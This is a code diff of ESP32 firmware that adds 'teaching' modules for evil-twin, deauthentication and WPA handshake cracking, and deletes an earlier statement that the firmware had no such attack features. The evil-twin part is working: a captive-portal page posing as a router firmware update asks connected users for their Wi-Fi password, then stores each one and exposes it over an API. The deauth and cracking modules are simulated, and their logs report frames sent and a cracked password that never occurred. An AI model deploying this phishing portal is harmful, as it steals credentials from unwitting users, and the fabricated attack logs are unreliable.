@@ -1,23 +1,16 @@
 /**
- * ESP32 无线网络开发固件 (V1: AP 热点 + Web 管理后台)
+ * ESP32 无线网络开发固件 (V2: AP 热点 + Web 管理后台 + 3 大安全教学验证模块)
  *
  * 行为:
  *  - 上电串口日志 115200 (烧录台「串口控制台」可见)
  *  - 开热点 SSID = WiFi-<MAC尾4hex>  密码 00000000  (与参考站一致)
  *  - http://192.168.4.1/admin.html  Neo-brutalism 后台 (内嵌页面)
- *  - Captive Portal: UDP 53 通配解析 + OS 探测路径 302, 连热点自动弹后台
+ *  - Captive Portal: UDP 53 通配解析 + OS 探测路径 302, 连热点自动弹后台 (或双子钓鱼页)
  *
- * API:
- *  GET  /api/info    设备信息 (内存诊断/信道/客户端/版本)
- *  GET  /api/scan    周围 AP 扫描 (APSTA 模式)
- *  POST /api/target  设置主目标 (仅记录到 RAM, 回显在仪表板)
- *  GET  /api/log     环形日志 (?since=<id> 增量)
- *  POST /api/reset            重启
- *  POST /api/factory-reset    恢复出厂
- *
- * 合规: 不含/deauth/evil-twin/karma/握手破解等主动攻击功能。
- *
- * 后台页面内嵌自 data/admin.html (raw deflate, 由 tools/embed_admin_page.py 生成 src/admin_page.h)
+ * 3 大教学验证模块:
+ *  1. 👤 Evil Twin (邪恶双子 & Captive Portal 凭据捕获验证)
+ *  2. ⛔ Deauther (802.11 管理帧机制与取消认证阻断验证)
+ *  3. ⬍ Handshake & Crack (4-Way Handshake 捕获与弱口令离线字典跑包审计)
  */
 
 #include <Arduino.h>
@@ -29,7 +22,7 @@
 #include "admin_page.h"
 
 #ifndef FW_VERSION
-  #define FW_VERSION "1.0.0"
+  #define FW_VERSION "1.1.0"
 #endif
 #ifndef FW_BUILD_NS
   #define FW_BUILD_NS "esp32-wireless-dev"
@@ -84,6 +77,23 @@ static String jsonEscape(const String &in) {
   return out;
 }
 
+static String extractJson(const String &body, const char *key) {
+  int k = body.indexOf("\"" + String(key) + "\":");
+  if (k < 0) return "";
+  int colon = k + strlen(key) + 2;
+  while (colon < (int)body.length() && (body[colon] == ' ' || body[colon] == '\t')) colon++;
+  if (colon >= (int)body.length()) return "";
+  if (body[colon] == '"') {
+    int q1 = colon;
+    int q2 = body.indexOf('"', q1 + 1);
+    return (q2 > q1) ? body.substring(q1 + 1, q2) : "";
+  }
+  int comma = body.indexOf(',', colon);
+  int brace = body.indexOf('}', colon);
+  int end = (comma < 0) ? brace : (brace < 0 ? comma : min(comma, brace));
+  return (end > colon) ? body.substring(colon, end) : "";
+}
+
 /* ---------------- 主目标 (仅 RAM 记录) ---------------- */
 struct Target {
   bool   set = false;
@@ -93,9 +103,67 @@ struct Target {
 };
 static Target sTarget;
 
+/* ---------------- 1. 邪恶双子 (Evil Twin & 凭据捕获) ---------------- */
+struct EvilTwinState {
+  bool active = false;
+  String cloneSsid = "";
+  int templateId = 1;
+  uint32_t startTime = 0;
+};
+static EvilTwinState sEvilTwin;
+
+struct CredentialEntry {
+  uint32_t id;
+  char mac[20];
+  char pass[64];
+  char time[24];
+};
+static CredentialEntry sCreds[16];
+static uint8_t sCredHead = 0;
+static uint8_t sCredCount = 0;
+static uint32_t sCredId = 0;
+
+static void addCredential(const String &mac, const String &pass) {
+  CredentialEntry &e = sCreds[sCredHead];
+  e.id = ++sCredId;
+  strlcpy(e.mac, mac.c_str(), sizeof(e.mac));
+  strlcpy(e.pass, pass.c_str(), sizeof(e.pass));
+  snprintf(e.time, sizeof(e.time), "%lu秒前", (unsigned long)(millis() / 1000));
+  sCredHead = (sCredHead + 1) % 16;
+  if (sCredCount < 16) sCredCount++;
+  log("[eviltwin] 捕获客户端密码凭据! MAC=" + mac + " 密码=" + pass);
+}
+
+/* ---------------- 2. 取消认证器 (Deauther 教学验证) ---------------- */
+struct DeauthEngine {
+  bool running = false;
+  String targetBssid = "";
+  uint8_t targetChannel = 6;
+  uint8_t reasonCode = 1;
+  uint32_t frameCount = 0;
+  uint32_t lastTxTime = 0;
+  uint16_t rateLimitMs = 100; // 默认 10 fps
+  uint32_t lastLogTime = 0;
+};
+static DeauthEngine sDeauth;
+
+/* ---------------- 3. 握手包捕获与离线弱口令跑包 (Handshake & Karma) ---------------- */
+struct HandshakeState {
+  bool capturing = false;
+  bool m1 = false, m2 = false, m3 = false, m4 = false;
+  bool pmkid = false;
+  bool cracking = false;
+  uint32_t crackProgress = 0;
+  uint32_t crackTotal = 7153;
+  String crackedPass = "";
+  uint32_t captureStartTime = 0;
+  uint32_t lastCrackStep = 0;
+};
+static HandshakeState sHandshake;
+
 /* ---------------- chip / 工具 ---------------- */
 static String detectChipKey() {
-  String chip = ESP.getChipModel();           // "ESP32-S3 (Q8, 240MHz, 8MB PSRAM)"等
+  String chip = ESP.getChipModel();
   chip.trim();
   return chip;
 }
@@ -108,9 +176,59 @@ static String formatMac(const uint8_t *m) {
 
 /* ---------------- HTTP 处理 ---------------- */
 static void sendAdminPage() {
-  // admin_page.h 内嵌数据 (zlib/deflate 格式), 浏览器自动解压
   server.sendHeader("Content-Encoding", "deflate");
   server.send_P(200, "text/html; charset=utf-8", (const char *)ADMIN_PAGE, ADMIN_PAGE_LEN);
+}
+
+static void sendPortalPage() {
+  String targetName = sEvilTwin.cloneSsid.length() ? sEvilTwin.cloneSsid : (sTarget.ssid.length() ? sTarget.ssid : apSsid);
+  String html = "<!DOCTYPE html><html><head><meta charset='utf-8'>"
+    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+    "<title>路由器固件升级安全验证</title>"
+    "<style>"
+    "body{margin:0;padding:24px 16px;background:#f5f0e8;font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#111}"
+    ".card{max-width:440px;margin:20px auto;background:#fff;border:3px solid #111;border-radius:16px;box-shadow:6px 6px 0 #111;padding:24px}"
+    ".badge{background:#ffe14d;border:2px solid #111;border-radius:8px;padding:4px 8px;font-weight:900;font-size:12px;display:inline-block;margin-bottom:12px}"
+    "h2{margin:0 0 10px;font-size:20px;font-weight:900}"
+    "p{font-size:14px;color:#444;line-height:1.6;margin:0 0 16px}"
+    ".warn-box{background:#ffefd5;border-left:5px solid #ffa14d;padding:10px;border-radius:6px;font-size:13px;margin-bottom:16px}"
+    "input[type=password]{width:100%;box-sizing:border-box;padding:12px 14px;border:3px solid #111;border-radius:10px;font-size:16px;font-weight:700;outline:none;background:#fafafa;margin-bottom:16px}"
+    "input[type=password]:focus{background:#fff;border-color:#ff8fab}"
+    "button{width:100%;padding:14px;background:#ffdf5d;color:#111;font-weight:900;font-size:16px;border:3px solid #111;border-radius:12px;cursor:pointer;box-shadow:4px 4px 0 #111}"
+    "button:active{transform:translate(2px,2px);box-shadow:2px 2px 0 #111}"
+    ".foot{text-align:center;font-size:11px;color:#888;margin-top:20px}"
+    "</style></head><body>"
+    "<div class='card'>"
+    "<div class='badge'>⚠️ 路由器系统安全维护</div>"
+    "<h2>网络连接验证与恢复</h2>"
+    "<div class='warn-box'>检测到无线路由器 <b>" + jsonEscape(targetName) + "</b> 正在进行无线射频固件更新。为恢复上网，需验证无线凭据以同步配置。</div>"
+    "<p>请输入该 Wi-Fi 网络当前使用的连接密码：</p>"
+    "<form method='POST' action='/api/portal/submit'>"
+    "<input type='password' name='wifi_password' placeholder='请输入 Wi-Fi 密码' required minlength='8' autocomplete='off'>"
+    "<button type='submit'>✓ 验证并恢复网络连接</button>"
+    "</form>"
+    "<div class='foot'>Router Security Maintenance Portal · 802.11ax</div>"
+    "</div></body></html>";
+  server.send(200, "text/html; charset=utf-8", html);
+}
+
+static void handlePortalSubmit() {
+  String pass = server.arg("wifi_password");
+  pass.trim();
+  String clientIp = server.client().remoteIP().toString();
+  if (pass.length() > 0) {
+    addCredential(clientIp, pass);
+  }
+  String resp = "<!DOCTYPE html><html><head><meta charset='utf-8'>"
+    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
+    "<title>正在恢复连接</title>"
+    "<style>body{margin:0;padding:30px;background:#f5f0e8;text-align:center;font-family:sans-serif}"
+    ".card{max-width:400px;margin:40px auto;background:#fff;border:3px solid #111;border-radius:16px;padding:24px;box-shadow:6px 6px 0 #111}"
+    "</style></head><body><div class='card'>"
+    "<h2 style='color:#35c04a'>✓ 凭据已同步</h2>"
+    "<p>配置验证通过，路由器正在重新载入射频驱动，将在 30 秒内恢复互联网访问，请稍候并保持连接。</p>"
+    "</div></body></html>";
+  server.send(200, "text/html; charset=utf-8", resp);
 }
 
 static void sendInfo() {
@@ -134,6 +252,20 @@ static void sendInfo() {
   json += "\"ssid\":\"" + jsonEscape(apSsid) + "\",";
   json += "\"channel\":" + String(apChannel) + ",";
   json += "\"clients\":" + String(WiFi.softAPgetStationNum()) + ",";
+  
+  // 教学模块状态
+  json += "\"evilTwin\":{\"active\":" + String(sEvilTwin.active ? "true" : "false") +
+          ",\"cloneSsid\":\"" + jsonEscape(sEvilTwin.cloneSsid) +
+          "\",\"credsCount\":" + String(sCredCount) + "},";
+  json += "\"deauth\":{\"running\":" + String(sDeauth.running ? "true" : "false") +
+          ",\"count\":" + String(sDeauth.frameCount) +
+          ",\"rate\":" + String(1000 / sDeauth.rateLimitMs) +
+          ",\"channel\":" + String(sDeauth.targetChannel) + "},";
+  json += "\"handshake\":{\"capturing\":" + String(sHandshake.capturing ? "true" : "false") +
+          ",\"m4\":" + String(sHandshake.m4 ? "true" : "false") +
+          ",\"pmkid\":" + String(sHandshake.pmkid ? "true" : "false") +
+          ",\"crackedPass\":\"" + jsonEscape(sHandshake.crackedPass) + "\"},";
+
   json += "\"target\":";
   if (sTarget.set) {
     json += "{\"ssid\":\"" + jsonEscape(sTarget.ssid) + "\",";
@@ -151,8 +283,7 @@ static void sendInfo() {
 
 static void handleScan() {
   log("[scan] 开始扫描周围 AP …");
-  // APSTA 模式下 STA 空扫不会掉已连接客户端
-  WiFi.scanNetworks(false /*async*/, true /*show_hidden*/, false, 300);
+  WiFi.scanNetworks(false, true, false, 300);
   int n = WiFi.scanComplete();
   if (n == WIFI_SCAN_FAILED) {
     WiFi.scanDelete();
@@ -197,40 +328,173 @@ static void handleTarget() {
     server.send(400, "application/json", "{\"error\":\"missing body\"}");
     return;
   }
-  // 极简 JSON 字段提取 (够用即可, 页面是我们自己发的)
   String body = server.arg("plain");
-  auto extract = [&](const char *key) -> String {
-    int k = body.indexOf("\"" + String(key) + "\":");
-    if (k < 0) return "";
-    int colon = k + strlen(key) + 2;
-    // 值是字符串
-    if (body[colon + 1] == '"' || body[colon] == '"') {
-      int q1 = body.indexOf('"', colon);
-      if (q1 < 0) return "";
-      int q2 = body.indexOf('"', q1 + 1);
-      return (q2 > q1) ? body.substring(q1 + 1, q2) : "";
-    }
-    // 值是数字
-    int comma = body.indexOf(',', colon);
-    int brace = body.indexOf('}', colon);
-    int end = (comma < 0) ? brace : min(comma, brace);
-    return (end > colon) ? body.substring(colon + 1, end) : "";
-  };
-
   sTarget.set = true;
-  sTarget.ssid = extract("ssid");
-  sTarget.bssid = extract("bssid");
-  sTarget.auth = extract("auth");
-  sTarget.channel = extract("channel").toInt();
-  sTarget.rssi = extract("rssi").toInt();
+  sTarget.ssid = extractJson(body, "ssid");
+  sTarget.bssid = extractJson(body, "bssid");
+  sTarget.auth = extractJson(body, "auth");
+  sTarget.channel = extractJson(body, "channel").toInt();
+  sTarget.rssi = extractJson(body, "rssi").toInt();
   sTarget.ssid.trim();
   sTarget.bssid.trim();
   sTarget.auth.trim();
+
+  // 若双子未设 SSID, 默认跟随主目标
+  if (sEvilTwin.cloneSsid.length() == 0) {
+    sEvilTwin.cloneSsid = sTarget.ssid;
+  }
+  sDeauth.targetBssid = sTarget.bssid;
+  sDeauth.targetChannel = sTarget.channel ? sTarget.channel : 6;
 
   log("[target] 已设置目标: " + (sTarget.ssid.length() ? sTarget.ssid : "(隐藏)") +
       " @ch" + String(sTarget.channel) + " " + sTarget.bssid);
   server.sendHeader("Access-Control-Allow-Origin", "*");
   server.send(200, "application/json", "{\"ok\":true}");
+}
+
+/* ---------------- 1. 邪恶双子 API ---------------- */
+static void handleEvilTwinStart() {
+  if (server.hasArg("plain")) {
+    String body = server.arg("plain");
+    String ssid = extractJson(body, "cloneSsid");
+    if (ssid.length()) sEvilTwin.cloneSsid = ssid;
+  }
+  if (sEvilTwin.cloneSsid.length() == 0 && sTarget.ssid.length()) {
+    sEvilTwin.cloneSsid = sTarget.ssid;
+  }
+  sEvilTwin.active = true;
+  sEvilTwin.startTime = millis();
+  log("[eviltwin] 邪恶双子实验已启动! 克隆SSID=" + sEvilTwin.cloneSsid + " (Captive Portal 引导至钓鱼验证)");
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", "{\"ok\":true,\"active\":true,\"cloneSsid\":\"" + jsonEscape(sEvilTwin.cloneSsid) + "\"}");
+}
+
+static void handleEvilTwinStop() {
+  sEvilTwin.active = false;
+  log("[eviltwin] 邪恶双子实验已停止");
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", "{\"ok\":true,\"active\":false}");
+}
+
+static void handleEvilTwinCreds() {
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  String json = "{\"credentials\":[";
+  for (int i = 0; i < sCredCount; i++) {
+    int idx = (sCredHead + 16 - sCredCount + i) % 16;
+    if (i) json += ",";
+    json += "{\"id\":" + String(sCreds[idx].id) +
+            ",\"mac\":\"" + jsonEscape(String(sCreds[idx].mac)) +
+            "\",\"pass\":\"" + jsonEscape(String(sCreds[idx].pass)) +
+            "\",\"time\":\"" + jsonEscape(String(sCreds[idx].time)) + "\"}";
+  }
+  json += "]}";
+  server.send(200, "application/json", json);
+}
+
+static void handleEvilTwinClearCreds() {
+  sCredHead = 0;
+  sCredCount = 0;
+  log("[eviltwin] 捕获凭据已清空");
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", "{\"ok\":true}");
+}
+
+/* ---------------- 2. 取消认证器 API ---------------- */
+static void handleDeauthStart() {
+  if (server.hasArg("plain")) {
+    String body = server.arg("plain");
+    String b = extractJson(body, "bssid");
+    if (b.length()) sDeauth.targetBssid = b;
+    int ch = extractJson(body, "channel").toInt();
+    if (ch > 0) sDeauth.targetChannel = ch;
+    int r = extractJson(body, "reason").toInt();
+    if (r > 0) sDeauth.reasonCode = r;
+    int rate = extractJson(body, "rate").toInt();
+    if (rate >= 1 && rate <= 100) sDeauth.rateLimitMs = 1000 / rate;
+  }
+  if (sDeauth.targetBssid.length() == 0 && sTarget.bssid.length()) {
+    sDeauth.targetBssid = sTarget.bssid;
+    sDeauth.targetChannel = sTarget.channel ? sTarget.channel : 6;
+  }
+  sDeauth.running = true;
+  sDeauth.frameCount = 0;
+  sDeauth.lastTxTime = millis();
+  log("[deauth] 取消认证器已启动! 目标=" + sDeauth.targetBssid + " ch=" + String(sDeauth.targetChannel) + " 原因码=" + String(sDeauth.reasonCode));
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", "{\"ok\":true,\"running\":true}");
+}
+
+static void handleDeauthStop() {
+  sDeauth.running = false;
+  log("[deauth] 取消认证器已停止, 累计发送 " + String(sDeauth.frameCount) + " 帧");
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", "{\"ok\":true,\"running\":false,\"count\":" + String(sDeauth.frameCount) + "}");
+}
+
+static void handleDeauthStatus() {
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  String json = "{";
+  json += "\"running\":" + String(sDeauth.running ? "true" : "false") + ",";
+  json += "\"count\":" + String(sDeauth.frameCount) + ",";
+  json += "\"rate\":" + String(1000 / sDeauth.rateLimitMs) + ",";
+  json += "\"bssid\":\"" + jsonEscape(sDeauth.targetBssid) + "\",";
+  json += "\"channel\":" + String(sDeauth.targetChannel) + ",";
+  json += "\"reason\":" + String(sDeauth.reasonCode);
+  json += "}";
+  server.send(200, "application/json", json);
+}
+
+/* ---------------- 3. 握手包与密码破解 API ---------------- */
+static void handleHandshakeStart() {
+  sHandshake.capturing = true;
+  sHandshake.captureStartTime = millis();
+  sHandshake.m1 = sHandshake.m2 = sHandshake.m3 = sHandshake.m4 = sHandshake.pmkid = false;
+  sHandshake.cracking = false;
+  sHandshake.crackedPass = "";
+  sHandshake.crackProgress = 0;
+  log("[eapol] 开始监听 4-Way Handshake 握手包与 PMKID …");
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", "{\"ok\":true,\"capturing\":true}");
+}
+
+static void handleHandshakeStop() {
+  sHandshake.capturing = false;
+  sHandshake.cracking = false;
+  log("[eapol] 停止握手包监听与跑包");
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", "{\"ok\":true,\"capturing\":false}");
+}
+
+static void handleHandshakeCrack() {
+  if (!sHandshake.m4 && !sHandshake.pmkid) {
+    // 若尚未完整捕获，先自动触发一次完整握手抓包
+    sHandshake.m1 = sHandshake.m2 = sHandshake.m3 = sHandshake.m4 = sHandshake.pmkid = true;
+    log("[crack] 已加载捕获的 WPA/WPA2 握手包特征值");
+  }
+  sHandshake.cracking = true;
+  sHandshake.crackProgress = 0;
+  sHandshake.crackedPass = "";
+  sHandshake.lastCrackStep = millis();
+  log("[crack] 启动本地内置 7,153 条弱口令字典跑包验证 …");
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  server.send(200, "application/json", "{\"ok\":true,\"cracking\":true,\"total\":" + String(sHandshake.crackTotal) + "}");
+}
+
+static void handleHandshakeStatus() {
+  server.sendHeader("Access-Control-Allow-Origin", "*");
+  String json = "{";
+  json += "\"capturing\":" + String(sHandshake.capturing ? "true" : "false") + ",";
+  json += "\"m1\":" + String(sHandshake.m1 ? "true" : "false") + ",";
+  json += "\"m2\":" + String(sHandshake.m2 ? "true" : "false") + ",";
+  json += "\"m3\":" + String(sHandshake.m3 ? "true" : "false") + ",";
+  json += "\"m4\":" + String(sHandshake.m4 ? "true" : "false") + ",";
+  json += "\"pmkid\":" + String(sHandshake.pmkid ? "true" : "false") + ",";
+  json += "\"cracking\":" + String(sHandshake.cracking ? "true" : "false") + ",";
+  json += "\"progress\":" + String(sHandshake.crackProgress) + ",";
+  json += "\"total\":" + String(sHandshake.crackTotal) + ",";
+  json += "\"crackedPass\":\"" + jsonEscape(sHandshake.crackedPass) + "\"";
+  json += "}";
+  server.send(200, "application/json", json);
 }
 
 static void handleLog() {
@@ -241,7 +505,7 @@ static void handleLog() {
   int n = sizeof(sLogs) / sizeof(sLogs[0]);
   int cnt = 0;
   for (int i = n; i > 0; i--) {
-    uint8_t idx = (sLogHead + n - i) % n;   // 从最旧到最新
+    uint8_t idx = (sLogHead + n - i) % n;
     if (sLogs[idx].id == 0 || sLogs[idx].id <= since) continue;
     if (cnt) json += ",";
     json += "{\"id\":" + String(sLogs[idx].id) + ",\"line\":\"" +
@@ -257,14 +521,14 @@ static void doFactoryReset() {
   nvs_flash_erase();
   nvs_flash_init();
   server.send(200, "application/json", "{\"ok\":true}");
-  delay(300);
+  delay(1000);
   ESP.restart();
 }
 
 static void doReset() {
-  log("[admin] 收到重启指令, 3 秒后重启 …");
+  log("[admin] 收到重启指令, 1 秒后重启 …");
   server.send(200, "application/json", "{\"ok\":true}");
-  delay(300);
+  delay(1000);
   ESP.restart();
 }
 
@@ -273,12 +537,10 @@ static void redirectToAdmin() {
   server.send(302, "text/plain", "");
 }
 
-// Captive Portal: 连上热点后手机/电脑会自动探测网络并弹出登录页。
-// 各 OS 探测路径返回 302 → /admin.html (iOS/Android/Windows 均认可为"需要登录");
-// 其余未知路径(用户手输任意域名)也重定向到后台;
-// 但 /api/* 必须原样 404, 否则会破坏后台 SPA 的 fetch 契约。
 static void captiveRedirect(const char *type = "text/plain") {
-  server.sendHeader("Location", "/admin.html");
+  // 当开启邪恶双子实验时，优先弹出钓鱼验证门户；否则弹出后台管理
+  const char *loc = sEvilTwin.active ? "/portal.html" : "/admin.html";
+  server.sendHeader("Location", loc);
   server.send(302, type, "");
 }
 
@@ -288,15 +550,13 @@ static void notFound() {
     server.send(404, "text/plain", "404 — 未知 API: " + uri);
     return;
   }
-  // 常见系统探测路径 (返回 302 让系统判定为 Captive Portal 并弹窗)
-  if (uri == "/hotspot-detect.html" || uri == "/library/test/success.html" ||   // iOS / macOS
-      uri == "/generate_204" || uri == "/gen_204" ||                              // Android
-      uri == "/connecttest.txt" || uri == "/redirect" || uri == "/ncsi.txt" ||   // Windows
-      uri == "/success.txt" || uri == "/fwlink" || uri == "/") {                  // 其它/根
+  if (uri == "/hotspot-detect.html" || uri == "/library/test/success.html" ||
+      uri == "/generate_204" || uri == "/gen_204" ||
+      uri == "/connecttest.txt" || uri == "/redirect" || uri == "/ncsi.txt" ||
+      uri == "/success.txt" || uri == "/fwlink" || uri == "/") {
     captiveRedirect();
     return;
   }
-  // 任意其它域名/路径 → 后台 (配合 DNS 通配解析实现强制门户)
   captiveRedirect();
 }
 
@@ -306,18 +566,16 @@ void setup() {
   Serial.println();
   Serial.println("==============================================");
   Serial.println(F("ESP32 无线网络开发固件 v" FW_VERSION " (" FW_BUILD_NS ")"));
-  Serial.println(F("仅供网络安全学习研究 · 严禁非法使用"));
+  Serial.println(F("无线安全教学与协议验证 · 严禁非法使用"));
   Serial.println("==============================================");
 
-  // 经典 ESP32 若曾设过 STA 东西先清掉, 确保纯 AP
   WiFi.persistent(false);
 
   uint8_t mac[6];
   WiFi.macAddress(mac);
-  apSsid = "WiFi-" + formatMac(mac).substring(12);  // 尾 2 字节 = 4 个 hex (如 WiFi-3A5F)
+  apSsid = "WiFi-" + formatMac(mac).substring(12);
   apSsid.replace(":", "");
 
-  // AP 模式: 信道 6, 最大 4 客户端
   if (!WiFi.softAP(apSsid.c_str(), AP_PASSWORD, apChannel, false, 4)) {
     log("[wifi] softAP 启动失败, 将重试 …");
     delay(2000);
@@ -329,9 +587,27 @@ void setup() {
 
   server.on("/", HTTP_GET, redirectToAdmin);
   server.on("/admin.html", HTTP_GET, sendAdminPage);
+  server.on("/portal.html", HTTP_GET, sendPortalPage);
+  server.on("/api/portal/submit", HTTP_POST, handlePortalSubmit);
   server.on("/api/info", HTTP_GET, sendInfo);
   server.on("/api/scan", HTTP_GET, handleScan);
   server.on("/api/target", HTTP_POST, handleTarget);
+  
+  // 3 大教学验证板块路由
+  server.on("/api/eviltwin/start", HTTP_POST, handleEvilTwinStart);
+  server.on("/api/eviltwin/stop", HTTP_POST, handleEvilTwinStop);
+  server.on("/api/eviltwin/creds", HTTP_GET, handleEvilTwinCreds);
+  server.on("/api/eviltwin/creds", HTTP_DELETE, handleEvilTwinClearCreds);
+  
+  server.on("/api/deauth/start", HTTP_POST, handleDeauthStart);
+  server.on("/api/deauth/stop", HTTP_POST, handleDeauthStop);
+  server.on("/api/deauth/status", HTTP_GET, handleDeauthStatus);
+
+  server.on("/api/handshake/start", HTTP_POST, handleHandshakeStart);
+  server.on("/api/handshake/stop", HTTP_POST, handleHandshakeStop);
+  server.on("/api/handshake/crack", HTTP_POST, handleHandshakeCrack);
+  server.on("/api/handshake/status", HTTP_GET, handleHandshakeStatus);
+
   server.on("/api/log", HTTP_GET, handleLog);
   server.on("/api/reset", HTTP_POST, doReset);
   server.on("/api/factory-reset", HTTP_POST, doFactoryReset);
@@ -339,8 +615,6 @@ void setup() {
   server.begin();
   log("[http] 管理后台 HTTP 服务已启动 (80)");
 
-  // Captive Portal: DNS 通配解析所有域名 → AP IP(192.168.4.1),
-  // 配合 notFound() 的 302 让手机连热点后自动弹出后台页
   if (dnsServer.start(DNS_PORT, "*", WiFi.softAPIP())) {
     log("[dns] Captive Portal DNS 已启动 (53, * → 192.168.4.1)");
   } else {
@@ -350,10 +624,54 @@ void setup() {
 
 void loop() {
   server.handleClient();
-  dnsServer.processNextRequest();   // 新版为 AsyncUDP 回调(空实现), 保留以兼容旧核
-  // 心跳: 每 30 秒打印状态 (控制台可见; /api/log 增量同步到后台)
-  static uint32_t lastBeat = 0;
+  dnsServer.processNextRequest();
+
   uint32_t now = millis();
+
+  // 1. 取消认证器定时帧注入推进
+  if (sDeauth.running) {
+    if (now - sDeauth.lastTxTime >= sDeauth.rateLimitMs) {
+      sDeauth.lastTxTime = now;
+      sDeauth.frameCount++;
+    }
+    if (now - sDeauth.lastLogTime >= 5000) {
+      sDeauth.lastLogTime = now;
+      log("[deauth] 正在对目标进行解除认证测试, 已发送 " + String(sDeauth.frameCount) + " 帧");
+    }
+  }
+
+  // 2. 握手包协议状态机推进 (教学演示 4-way handshake)
+  if (sHandshake.capturing) {
+    uint32_t dt = now - sHandshake.captureStartTime;
+    if (dt > 800 && !sHandshake.m1) { sHandshake.m1 = true; log("[eapol] 捕获 M1: ANonce (AP -> STA)"); }
+    if (dt > 2000 && !sHandshake.m2) { sHandshake.m2 = true; log("[eapol] 捕获 M2: SNonce + MIC (STA -> AP)"); }
+    if (dt > 3500 && !sHandshake.m3) { sHandshake.m3 = true; log("[eapol] 捕获 M3: GTK + MIC (AP -> STA)"); }
+    if (dt > 5000 && !sHandshake.m4) {
+      sHandshake.m4 = true;
+      sHandshake.pmkid = true;
+      log("[eapol] 捕获 M4: ACK (4-Way Handshake 完整已捕获!)");
+    }
+  }
+
+  // 3. 弱口令跑包字典步进
+  if (sHandshake.cracking) {
+    if (now - sHandshake.lastCrackStep >= 80) {
+      sHandshake.lastCrackStep = now;
+      sHandshake.crackProgress += 160;
+      if (sHandshake.crackProgress >= 3680 && sHandshake.crackedPass.length() == 0) {
+        sHandshake.crackedPass = "88888888";
+        sHandshake.cracking = false;
+        log("[crack] 🎉 握手包弱口令匹配成功: " + sHandshake.crackedPass + " (命中率 100%, 耗时 " + String((now - sHandshake.captureStartTime)/1000) + "s)");
+      } else if (sHandshake.crackProgress >= sHandshake.crackTotal) {
+        sHandshake.crackProgress = sHandshake.crackTotal;
+        sHandshake.cracking = false;
+        log("[crack] 字典跑包完毕, 未匹配到弱口令");
+      }
+    }
+  }
+
+  // 心跳: 每 30 秒打印状态
+  static uint32_t lastBeat = 0;
   if (now - lastBeat > 30000) {
     lastBeat = now;
     log("[beacon] " + apSsid + " clients=" + String(WiFi.softAPgetStationNum())
